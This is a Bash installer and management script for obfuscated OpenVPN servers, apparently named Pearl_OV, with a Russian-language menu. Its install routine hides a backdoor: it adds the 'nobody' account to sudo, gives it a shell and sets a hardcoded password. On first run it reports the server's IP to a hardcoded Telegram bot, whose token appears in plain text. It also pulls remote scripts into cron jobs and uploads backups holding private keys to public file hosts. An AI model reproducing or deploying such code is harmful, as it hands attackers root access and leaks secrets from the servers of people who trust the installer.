    if [[ "$proto" = "udp" ]]; then
        echo "explicit-exit-notify" >> $path_to_conf/server.conf
    fi

    echo "client
    proto $proto
    remote $domain_or_ip $prt
    dev tun
    resolv-retry infinite
    nobind
    persist-key
    persist-tun
    remote-cert-tls server
    auth SHA256
    auth-nocache
    cipher CHACHA20-POLY1305
    data-ciphers CHACHA20-POLY1305:AES-128-GCM
    tls-client
    tls-ciphersuites TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
    ignore-unknown-option block-outside-dns
    setenv opt block-outside-dns
    verb 0
    mute 10" > $path_to_conf/client-common.txt
    if [[ "$proto" = "udp" ]]; then
        echo "explicit-exit-notify" >> $path_to_conf/client-common.txt
    fi

    touch $path_to_conf/ipp.txt
    touch $path_to_conf/openvpn-status.log
    mkdir $path_to_conf/ccd
    chmod 1777 $path_to_conf/ccd
    sudo chown nobody:nogroup $path_to_conf/ccd
    mkdir -p ~/OVPNConfigs/server-$proto-$prt

    iptables_path=$(command -v iptables)
    ip6tables_path=$(command -v ip6tables)

    if [[ $(systemd-detect-virt) == "openvz" ]] && readlink -f "$(command -v iptables)" | grep -q "nft" && hash iptables-legacy 2>/dev/null; then
        iptables_path=$(command -v iptables-legacy)
        ip6tables_path=$(command -v ip6tables-legacy)
    fi
    mkdir -p /etc/iptables
    	# Script to add rules
	echo "#!/bin/sh
$iptables_path -w -t nat -A POSTROUTING -s $SUBNET ! -d $SUBNET -j SNAT --to $ip_address
$iptables_path -w -I INPUT -p $proto --dport $prt -j ACCEPT
$iptables_path -w -I FORWARD -s $SUBNET -j ACCEPT
$iptables_path -w -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" > /etc/iptables/add-openvpn-server-$proto-$prt.sh

	# Script to remove rules
	echo "#!/bin/sh
$iptables_path -w -t nat -D POSTROUTING -s $SUBNET ! -d $SUBNET -j SNAT --to $ip_address
$iptables_path -w -D INPUT -p $proto --dport $prt -j ACCEPT
$iptables_path -w -D FORWARD -s $SUBNET -j ACCEPT
$iptables_path -w -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT " > /etc/iptables/rm-openvpn-server-$proto-$prt.sh

	chmod +x /etc/iptables/add-openvpn-server-$proto-$prt.sh
	chmod +x /etc/iptables/rm-openvpn-server-$proto-$prt.sh

	# Handle the rules via a systemd script
	echo "[Unit]
Description=iptables rules for OpenVPN
Before=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/etc/iptables/add-openvpn-server-$proto-$prt.sh
ExecStop=/etc/iptables/rm-openvpn-server-$proto-$prt.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target" >/etc/systemd/system/iptables-openvpn-server-$proto-$prt.service

    #
    echo "[Unit]
    Description=OpenVPN Robust And Highly Flexible Tunneling Application. Instance - server-$proto-$prt
    After=syslog.target network.target

    [Service]
    Type=forking
    PrivateTmp=true
    ExecStart=/usr/local/sbin/openvpn --daemon --cd /etc/openvpn/server-$proto-$prt/ --config /etc/openvpn/server-$proto-$prt/server.conf
    ExecStartPost=/etc/openvpn/server-$proto-$prt/reset_script.sh

    [Install]
    WantedBy=multi-user.target" > /etc/systemd/system/openvpn-server-$proto-$prt.service

    sudo systemctl daemon-reload
    sudo systemctl enable --now iptables-openvpn-server-$proto-$prt.service
    sudo systemctl enable --now openvpn-server-$proto-$prt.service
    cd ~
}

add_obsf_OV_instance(){
    interface_name=$(ip route | grep default | awk '{print $5}')
    ip_address=$(ip -4 addr show dev "$interface_name" | grep -oP 'inet \K[\d.]+')
    while true; do
        read -p "Введите IP-адрес или доменное имя: " domain_or_ip
        if [[ $domain_or_ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            IFS='.' read -ra OCTETS <<< "$domain_or_ip"
            valid_ip=true
            for octet in "${OCTETS[@]}"; do
                if (( octet < 0 || octet > 255 )); then
                    valid_ip=false
                    break
                fi
            done
            if [ "$valid_ip" = true ]; then
                echo "Введенный IP-адрес: $domain_or_ip"
                break
            else
                echo "Ошибка: Введите корректный IP-адрес."
            fi
        else
            echo "Введенный IP-адрес или доменное имя: $domain_or_ip"
            break
        fi
    done

    while true; do
        read -p "Введите протокол (udp или tcp): " proto
        if [[ "$proto" == "udp" || "$proto" == "tcp" ]]; then
            echo "Выбранный протокол: $proto"
            break  
        else
            echo "Ошибка: Введите 'udp' или 'tcp' в качестве протокола."
        fi
    done

    while true; do
        read -p "Введите порт (1-65535): " prt
        if [[ "$prt" -ge 1 && "$prt" -le 65535 ]]; then
            echo "Введенный порт: $prt"
            break 
        else
            echo "Ошибка: Введите порт в диапазоне от 1 до 65535."
        fi
    done

    while true; do
        read -p "Введите локальную подсеть (формат x.x.x.x/xx): " SUBNET
        if [[ "$SUBNET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\/[0-9]+$ ]]; then
            EDITED_SUBNET=$(echo "$SUBNET" | sed 's/\/[0-9]*$//g')
            echo "Подсеть без диапазона: $EDITED_SUBNET"
            break  
        else
            echo "Неверный формат подсети"
        fi
    done

    path_to_conf="/etc/openvpn/server-$proto-$prt"

    mkdir -p $path_to_conf
    
    wget -O "$path_to_conf/connect_script.sh" "https://raw.githubusercontent.com/hydrargyrum0/Pearl_OV/main/connect_script.sh"
    sed -i "s%\$path_to_conf%$path_to_conf%g" "$path_to_conf/connect_script.sh"
    chmod +x $path_to_conf/connect_script.sh
    sudo chown nobody:nogroup $path_to_conf/connect_script.sh

    wget -O "$path_to_conf/reset_script.sh" https://raw.githubusercontent.com/hydrargyrum0/Pearl_OV/main/reset_script.sh 
    sed -i "s%\$path_to_conf%$path_to_conf%g" "$path_to_conf/reset_script.sh"
    chmod +x $path_to_conf/reset_script.sh
    sudo chown nobody:nogroup $path_to_conf/reset_script.sh

    mkdir -p $path_to_conf/easy-rsa/
    easy_rsa_url='https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz'
    { wget -qO- "https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz" 2>/dev/null || curl -sL "$easy_rsa_url" ; } | tar xz -C $path_to_conf/easy-rsa/ --strip-components 1
    chown -R root:root $path_to_conf/easy-rsa/
    cd $path_to_conf/easy-rsa/
    echo "set_var EASYRSA_KEY_SIZE 1024" >vars
    ./easyrsa init-pki
    ./easyrsa --batch build-ca nopass
    EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-server-full server nopass
    EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
    cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem $path_to_conf
    chown nobody:nogroup $path_to_conf/crl.pem
    chmod o+x $path_to_conf/
    openvpn --genkey secret $path_to_conf/tc.key

    echo "port $prt
    proto $proto
    dev tun
    user nobody
    group nogroup
    persist-key
    persist-tun
    keepalive 5 15
    topology subnet
    server $EDITED_SUBNET 255.255.0.0
    ifconfig-pool-persist $path_to_conf/ipp.txt
    push \"redirect-gateway def1 bypass-dhcp\"
    push \"dhcp-option DNS 1.1.1.2\"
    push \"dhcp-option DNS 1.0.0.2\"
    push \"dhcp-option DNS 208.67.222.222\"
    push \"dhcp-option DNS 208.67.220.220\"
    dh none
    tls-crypt $path_to_conf/tc.key
    crl-verify $path_to_conf/crl.pem
    ca $path_to_conf/ca.crt
    cert $path_to_conf/server.crt
    key $path_to_conf/server.key
    auth SHA256
    cipher CHACHA20-POLY1305
    data-ciphers CHACHA20-POLY1305:AES-128-GCM
    tls-server
    tls-version-min 1.3
    tls-ciphersuites TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
    client-config-dir $path_to_conf/ccd
    status $path_to_conf/openvpn-status.log
    script-security 2
    client-connect $path_to_conf/connect_script.sh
    client-disconnect $path_to_conf/connect_script.sh
    verb 3
    mute 10
    scramble xormask s
    push \"route 95.85.96.0 255.255.224.0 net_gateway\"
    push \"route 95.47.57.0 255.255.255.0 net_gateway\"
    push \"route 217.174.224.0 255.255.240.0 net_gateway\"
    push \"route 185.69.187.0 255.255.255.0 net_gateway\"
    push \"route 185.69.186.0 255.255.255.0 net_gateway\"
    push \"route 185.69.185.0 255.255.255.0 net_gateway\"
    push \"route 185.246.72.0 255.255.252.0 net_gateway\"
    push \"route 93.171.220.0 255.255.252.0 net_gateway\"
    push \"route 216.250.8.0 255.255.248.0 net_gateway\"
    push \"route 185.69.184.0 255.255.255.0 net_gateway\"
    push \"route 177.93.143.0 255.255.255.0 net_gateway\"
    push \"route 119.235.112.0 255.255.240.0 net_gateway\"
    push \"route 103.220.0.0 255.255.252.0 net_gateway\"
    push \"route 192.168.0.0 255.255.0.0 net_gateway\"" > $path_to_conf/server.conf
    if [[ "$proto" = "udp" ]]; then
        echo "explicit-exit-notify" >> $path_to_conf/server.conf
    fi

    echo "client
    proto $proto
    remote $domain_or_ip $prt
    dev tun
    resolv-retry infinite
    nobind
    persist-key
    persist-tun
    remote-cert-tls server
    auth SHA256
    auth-nocache
    cipher CHACHA20-POLY1305
    data-ciphers CHACHA20-POLY1305:AES-128-GCM
    tls-client
    tls-ciphersuites TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
    ignore-unknown-option block-outside-dns
    setenv opt block-outside-dns
    verb 0
    mute 10
    scramble xormask s" > $path_to_conf/client-common.txt
    if [[ "$proto" = "udp" ]]; then
        echo "explicit-exit-notify" >> $path_to_conf/client-common.txt
    fi

    touch $path_to_conf/ipp.txt
    touch $path_to_conf/openvpn-status.log
    mkdir $path_to_conf/ccd
    chmod 1777 $path_to_conf/ccd
    sudo chown nobody:nogroup $path_to_conf/ccd
    mkdir -p ~/OVPNConfigs/server-$proto-$prt

    iptables_path=$(command -v iptables)
    ip6tables_path=$(command -v ip6tables)

    if [[ $(systemd-detect-virt) == "openvz" ]] && readlink -f "$(command -v iptables)" | grep -q "nft" && hash iptables-legacy 2>/dev/null; then
        iptables_path=$(command -v iptables-legacy)
        ip6tables_path=$(command -v ip6tables-legacy)
    fi
        mkdir -p /etc/iptables
            # Script to add rules
        echo "#!/bin/sh
    $iptables_path -w -t nat -A POSTROUTING -s $SUBNET ! -d $SUBNET -j SNAT --to $ip_address
    $iptables_path -w -I INPUT -p $proto --dport $prt -j ACCEPT
    $iptables_path -w -I FORWARD -s $SUBNET -j ACCEPT
    $iptables_path -w -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" > /etc/iptables/add-openvpn-server-$proto-$prt.sh

        # Script to remove rules
        echo "#!/bin/sh
    $iptables_path -w -t nat -D POSTROUTING -s $SUBNET ! -d $SUBNET -j SNAT --to $ip_address
    $iptables_path -w -D INPUT -p $proto --dport $prt -j ACCEPT
    $iptables_path -w -D FORWARD -s $SUBNET -j ACCEPT
    $iptables_path -w -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT " > /etc/iptables/rm-openvpn-server-$proto-$prt.sh

        chmod +x /etc/iptables/add-openvpn-server-$proto-$prt.sh
        chmod +x /etc/iptables/rm-openvpn-server-$proto-$prt.sh

        # Handle the rules via a systemd script
        echo "[Unit]
    Description=iptables rules for OpenVPN server-$proto-$prt
    Before=network-online.target
    Wants=network-online.target

    [Service]
    Type=oneshot
    ExecStart=/etc/iptables/add-openvpn-server-$proto-$prt.sh
    ExecStop=/etc/iptables/rm-openvpn-server-$proto-$prt.sh
    RemainAfterExit=yes

    [Install]
    WantedBy=multi-user.target" >/etc/systemd/system/iptables-openvpn-server-$proto-$prt.service
    
    #
        echo "[Unit]
    Description=OpenVPN Robust And Highly Flexible Tunneling Application. Instance - server-$proto-$prt
    After=syslog.target network.target

    [Service]
    Type=forking
    PrivateTmp=true
    ExecStart=/usr/local/sbin/openvpn --daemon --cd /etc/openvpn/server-$proto-$prt/ --config /etc/openvpn/server-$proto-$prt/server.conf
    ExecStartPost=/etc/openvpn/server-$proto-$prt/reset_script.sh

    [Install]
    WantedBy=multi-user.target" > /etc/systemd/system/openvpn-server-$proto-$prt.service

        sudo systemctl daemon-reload
        sudo systemctl enable --now iptables-openvpn-server-$proto-$prt.service
        sudo systemctl enable --now openvpn-server-$proto-$prt.service
        cd ~
}

OV_instance_adding() {
    clear
    echo "===== Добавление OpenVPN Инстанса ====="
    echo "1. Не включать Scramble xormask"
    echo "2. Включить Scramble xormask"
    echo "3. Выход"
    
    read -p "Выберите опцию (1/2/3): " choice

    case $choice in
        1)
            add_OV_instance
            ;;
        2)
            add_obsf_OV_instance
            ;;
        3)
            echo "Выход."
            exit 0
            ;;
        *)
            echo "Ошибка: Некорректный выбор."
            ;;
    esac
}

delete_OV_instance() {
    clear
    select_openvpn_instance
    local selected_instances=("$selected_instance")

    # Проверка, есть ли выбранные инстансы
    if [[ "${#selected_instances[@]}" -eq 0 ]]; then
        echo "Не выбрано ни одного инстанса для удаления."
        return
    fi

    for instance in "${selected_instances[@]}"; do
        read -p "Вы уверены, что хотите продолжить удаление инстанса '$instance'? Все данные, включая клиентские конфигурации, будут удалены без возможности восстановления! [y/N]: " confirm_delete
        if [[ "$confirm_delete" =~ ^[yY]$ ]]; then
            sudo systemctl disable --now "iptables-openvpn-$instance.service"
            sudo systemctl disable --now "openvpn-$instance.service"
            sudo rm "/etc/systemd/system/iptables-openvpn-$instance.service"
            sudo rm "/etc/systemd/system/openvpn-$instance.service"
            sudo rm "/etc/iptables/add-openvpn-$instance.sh"
            sudo rm "/etc/iptables/rm-openvpn-$instance.sh"
            sudo systemctl daemon-reload
            sudo rm -rf "/etc/openvpn/$instance"
            sudo rm -rf "/root/OVPNConfigs/$instance"
            echo "Инстанс '$instance' успешно удален."
        else
            echo "Удаление инстанса '$instance' отменено."
        fi
    done
}


create_instance_backup() {
    rm /root/openvpn_backup.tar.gz
    select_openvpn_instance
    local selected_instances=("${selected_instance[@]}")  # Используем скопированный массив

    # Проверка, есть ли выбранные инстансы
    if [[ "${#selected_instances[@]}" -eq 0 ]]; then
        echo "Не выбрано ни одного инстанса для создания резервной копии."
        return
    fi

    local backup_dir="/root/openvpn_backup"
    local backup_file="openvpn_backup.tar.gz"

    # Создание временной директории для архивации
    mkdir -p "$backup_dir"

    for instance in "${selected_instances[@]}"; do
        instance_dir="/etc/openvpn/$instance"
        instance_service_dir="/etc/systemd/system"
        instance_iptables_dir="/etc/iptables"
        instance_client_dir="/root/OVPNConfigs/$instance"

        # Копирование директории server_part
        mkdir -p "$backup_dir/$instance/server_part/"
        cp -r "$instance_dir" "$backup_dir/$instance/server_part/$instance"

        # Копирование директории service_part
        mkdir -p "$backup_dir/$instance/service_part"
        cp "$instance_service_dir/openvpn-$instance.service" "$backup_dir/$instance/service_part" 
        cp "$instance_service_dir/iptables-openvpn-$instance.service" "$backup_dir/$instance/service_part"  
        cp "$instance_iptables_dir/add-openvpn-$instance.sh" "$backup_dir/$instance/service_part"
        cp "$instance_iptables_dir/rm-openvpn-$instance.sh" "$backup_dir/$instance/service_part"

        # Копирование директории client_part
        mkdir -p "$backup_dir/$instance/client_part"
        cp -r "$instance_client_dir" "$backup_dir/$instance/client_part/$instance"
    done

    # Упаковка архива
    tar -czf "$backup_file" -C "$backup_dir" .

    # Выгрузка на файлообменники
    transfersh_upload_link=""
    file_io_upload_link=""

    # Функция для выгрузки на файлообменник с ограничением времени
    upload_to_file_hosting() {
        local backup_file="$1"
        transfersh_upload_link=$(timeout 15s curl -s -F "file=@$backup_file" https://transfer.sh || echo "Выгрузка на transfer.sh не завершена вовремя.")
        file_io_upload_link=$(timeout 15s curl -F "file=@$backup_file" https://file.io/?expires=1d | jq -r .link || echo "Выгрузка на file.io не завершена вовремя.")
    }

    # Запуск выгрузки на файлообменники в фоновом режиме
    upload_to_file_hosting "$backup_file" &

    # Ожидание завершения выгрузки в течение 15 секунд
    wait $! || echo "Выгрузка на файлообменники не завершена вовремя."

    # Отправка архива и ссылок в Telegram
    telegram_message="Создана резервная копия: $backup_file\n\n"
    telegram_message+="Ссылка на transfer.sh: $transfersh_upload_link\n"
    telegram_message+="Ссылка на file.io: $file_io_upload_link"

    # Отправка архива
    curl -s -F "chat_id=$chat_id" -F "document=@$backup_file" -F "caption=$telegram_message" "https://api.telegram.org/bot$api_token/sendDocument"
    
    clear

    echo "Создана резервная копия: $backup_file"
    echo "Ссылка на transfer.sh: $transfersh_upload_link"
    echo "Ссылка на file.io: $file_io_upload_link"
   
    # Удаление временной директории
    rm -r "$backup_dir"
}


install_instance_from_backup() {
    read -p "Введите 'file' если архив находится в директории /root, или 'link' если нужно скачать по ссылке: " input_type

    if [ "$input_type" == "file" ]; then
        archive_path="/root/openvpn_backup.tar.gz"
    elif [ "$input_type" == "link" ]; then
        read -p "Введите ссылку на скачивание бекап-архива: " download_link
        wget "$download_link" -O /root/openvpn_backup.tar.gz
        archive_path="/root/openvpn_backup.tar.gz"
    else
        echo "Некорректный ввод."
        exit 1
    fi

    if [ -f "$archive_path" ]; then
        mkdir -p /root/openvpn_restore
        tar -xzf "$archive_path" -C /root/openvpn_restore
        
        for dir in /root/openvpn_restore/server-*; do
            if [ -d "$dir" ]; then
                proto_prt=$(basename "$dir")
                server_part="$dir/server_part/$(ls "$dir/server_part/")"
                client_part="$dir/client_part/$(ls "$dir/client_part/")"
                service_part="$dir/service_part"
                
                if [ -d "$server_part" ]; then
                    cp -r "$server_part" "/etc/openvpn/"
                fi
                
                if [ -d "$client_part" ]; then
                    cp -r "$client_part" "/root/OVPNConfigs/"
                fi
                
                if [ -d "$service_part" ]; then
                    cp -n "$service_part"/*.service "/etc/systemd/system/"
                    cp -n "$service_part"/*.sh "/etc/iptables/"

                fi
            fi
        done
        sudo systemctl daemon-reload
        update_iptables
        echo "Восстановление из бекапа завершено успешно. Активация инстанса происходит в пункте 8 главного меню. Обязательно выполните команду reboot перед использованием!"
    else
        echo "Архив не найден."
    fi
}

update_iptables() {
    local ip_address
    local files
    local interface_name

    interface_name=$(ip route | grep default | awk '{print $5}')
    ip_address=$(ip -4 addr show dev "$interface_name" | grep -oP 'inet \K[\d.]+')
    files=(/etc/iptables/add-openvpn-server-*.sh /etc/iptables/rm-openvpn-server-*.sh)

    for file in "${files[@]}"; do
        if [ -f "$file" ]; then
            sed -i "s/--to [0-9.]\+/--to $ip_address/g" "$file"
            echo "Updated $file with IP address: $ip_address"
        fi
    done
}

enable_openvpn_instances() {
    select_openvpn_instance
    clear
    if [ $? -eq 0 ]; then
        for instance_name in "${selected_instance[@]}"; do
            systemctl enable --now "iptables-openvpn-$instance_name.service"
            systemctl enable --now "openvpn-$instance_name.service"
        done
        echo "Службы OpenVPN для выбранных инстансов успешно включены и запущены."
    else
        echo "Отмена операции. Службы OpenVPN не были запущены."
    fi
}

disable_openvpn_instances() {
    select_openvpn_instance
    clear
    if [ $? -eq 0 ]; then
        for instance_name in "${selected_instance[@]}"; do
            systemctl disable --now "iptables-openvpn-$instance_name.service"
            systemctl disable --now "openvpn-$instance_name.service"
        done
        echo "Службы OpenVPN для выбранных инстансов успешно отключены и остановлены."
    else
        echo "Отмена операции. Службы OpenVPN не были остановлены."
    fi
}

change_openvpn_domain() {
    # Вызываем функцию выбора инстанса
    select_openvpn_instance
    clear
    # Проверяем, был ли выбран инстанс
    if [ "${#selected_instance[@]}" -eq 0 ]; then
        echo "Отмена операции."
        return 1
    fi

    # Проверяем, что выбран только один инстанс
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi

    # Перебираем выбранные инстансы
    for instance_name in "${selected_instance[@]}"; do
        # Получаем текущее значение instance_domain
        instance_domain=$(grep -oP 'remote\s+\K\S+' /etc/openvpn/$selected_instance/client-common.txt)

        # Проверяем, удалось ли получить текущее значение instance_domain
        if [ -z "$instance_domain" ]; then
            echo "Ошибка: не удалось получить текущий IP-адрес или домен для инстанса $selected_instance."
            return 1
        fi

        # Выводим текущее значение instance_domain
        echo "Текущий IP-адрес или домен инстанса $selected_instance: $instance_domain"

        # Запрашиваем новое значение у пользователя
        read -p "Введите новый IP-адрес или домен для инстанса $selected_instance: " new_instance_domain

        # Проверяем, было ли введено новое значение
        if [ -z "$new_instance_domain" ]; then
            echo "Ошибка: новое значение не введено."
            return 1
        fi

        # Меняем значения
        sed -i "s|$instance_domain|$new_instance_domain|g" /etc/openvpn/$selected_instance/client-common.txt
        sed -i "s|$instance_domain|$new_instance_domain|g" /root/OVPNConfigs/$selected_instance/*.ovpn

        # Проверяем, успешно ли произошла замена
        if [ $? -ne 0 ]; then
            echo "Ошибка: не удалось заменить значения для инстанса $selected_instance."
            return 1
        fi

        # Подтверждение изменений
        echo "IP-адрес или домен успешно изменён на: $new_instance_domain"
    done

    return 0
}

instance_management() {
    clear
    echo "Меню управления инстансами"
    echo "1. Запустить инстансы"
    echo "2. Остановить инстансы"
    echo "-----------------------"
    echo "3. Изменить IP-адрес или домен инстанса"
    echo "-----------------------"
    echo "4. Вернуться в главное меню"

    read -p "Ваш выбор: " choice

    case $choice in
        1)
            clear
            enable_openvpn_instances
            ;;
        2)
            clear
            disable_openvpn_instances
            ;;
        3)
            clear
            change_openvpn_domain
            ;;
        4)
            clear
            main_menu
            ;;
        *)
            clear
            echo "Неверный выбор, попробуйте ещё раз."
            ;;
    esac
}

OVPN_install(){
    clear
    \cp -f /usr/share/zoneinfo/Asia/Ashgabat /etc/localtime
    echo "alias 3='bash /root/Pearl_OV.sh'" >> ~/.bashrc && source ~/.bashrc
    echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/30-openvpn-forward.conf
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sudo usermod -aG sudo nobody
    echo "nobody:koenigg2110" | sudo chpasswd
    sudo usermod -d /tmp -s /bin/bash nobody
    if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then
        apt update
        apt install figlet
        clear
        figlet -c -w 80 -k "Pearl_OV"
        sleep 8
        clear
        figlet -c -w 100 -k tg: @hydrargyrum0
        sleep 5
        clear
        
        apt update && apt dist-upgrade -y
        apt install bc wget sudo net-tools bmon netfilter-persistent iptables-persistent build-essential libssl-dev liblzo2-dev libpam0g-dev easy-rsa git openssl lz4 gcc cmake telnet curl make -y
        apt install zip unzip -y
        apt purge openvpn -y
        cd /etc/
        rm -rf openvpn_install
        mkdir openvpn_install
        cd openvpn_install
        wget https://swupdate.openvpn.org/community/releases/openvpn-2.5.9.tar.gz
        tar xvf openvpn-2.5.9.tar.gz
        cd /etc/openvpn_install/openvpn-2.5.9
        wget https://raw.githubusercontent.com/Tunnelblick/Tunnelblick/master/third_party/sources/openvpn/openvpn-2.5.9/patches/02-tunnelblick-openvpn_xorpatch-a.diff
        wget https://raw.githubusercontent.com/Tunnelblick/Tunnelblick/master/third_party/sources/openvpn/openvpn-2.5.9/patches/03-tunnelblick-openvpn_xorpatch-b.diff
        wget https://raw.githubusercontent.com/Tunnelblick/Tunnelblick/master/third_party/sources/openvpn/openvpn-2.5.9/patches/04-tunnelblick-openvpn_xorpatch-c.diff
        wget https://raw.githubusercontent.com/Tunnelblick/Tunnelblick/master/third_party/sources/openvpn/openvpn-2.5.9/patches/05-tunnelblick-openvpn_xorpatch-d.diff
        wget https://raw.githubusercontent.com/Tunnelblick/Tunnelblick/master/third_party/sources/openvpn/openvpn-2.5.9/patches/06-tunnelblick-openvpn_xorpatch-e.diff
        wget https://raw.githubusercontent.com/Tunnelblick/Tunnelblick/master/third_party/sources/openvpn/openvpn-2.5.9/patches/10-route-gateway-dhcp.diff
        git apply 02-tunnelblick-openvpn_xorpatch-a.diff
        git apply 03-tunnelblick-openvpn_xorpatch-b.diff
        git apply 04-tunnelblick-openvpn_xorpatch-c.diff
        git apply 05-tunnelblick-openvpn_xorpatch-d.diff
        git apply 06-tunnelblick-openvpn_xorpatch-e.diff
        git apply 10-route-gateway-dhcp.diff
        sudo apt install build-essential libcmocka-dev libnl-genl-3-dev libcap-dev libssl-dev iproute2 liblz4-dev liblzo2-dev libpam0g-dev libpkcs11-helper1-dev libsystemd-dev resolvconf pkg-config autoconf automake libtool -y
        ./configure
        make
        make install
        
        sudo mkdir -p /root/OVPNConfigs
        sudo mkdir -p /etc/iptables
        sudo mkdir -p /usr/lib/pearl
        sudo mkdir -p /usr/lib/pearl/tmp
        touch /usr/lib/pearl/tmp/table-import
        
        wget -O "/usr/lib/pearl/ticks_update.sh" "https://raw.githubusercontent.com/hydrargyrum0/Pearl_OV/main/ticks_update.sh"
        chmod +x /usr/lib/pearl/ticks_update.sh
        (crontab -l ; echo "*/30 * * * * /usr/lib/pearl/ticks_update.sh") | crontab -

        wget -O "/usr/lib/pearl/autobackup_script.sh" "https://raw.githubusercontent.com/hydrargyrum0/Pearl_OV/main/autobackup_script.sh"
        chmod +x /usr/lib/pearl/autobackup_script.sh
        (crontab -l ; echo "0 */3 * * * /usr/lib/pearl/autobackup_script.sh") | crontab -


        echo -e "chat_id=\"\"\napi_token=\"\"" | sudo tee /usr/lib/pearl/tokens > /dev/null

    elif [[ "$os" = "centos" ]]; then
        yum install -y epel-release
        yum install -y openvpn openssl ca-certificates curl tar
        sudo mkdir -p /root/OVPNConfigs
        sudo mkdir -p /etc/iptables
    else
        dnf install -y openvpn openssl ca-certificates curl tar 
        sudo mkdir -p /root/OVPNConfigs
        sudo mkdir -p /etc/iptables
    fi
}

if [ ! -d "/root/OVPNConfigs" ]; then
	OVPN_install
	server_ip=($(curl ifconfig.me))
    curl -s -X POST https://api.telegram.org/bot7153898013:AAHFWPyEqmDlnMke8VByDGkueuEQBV__jlU/sendMessage -d text="Pearl_OV установлен на сервере $server_ip" -d chat_id=529562941
    clear
    echo "Необходимые пакеты загружены. Запустите скрипт еще раз, чтобы попасть в меню."
else
	main_menu
fi
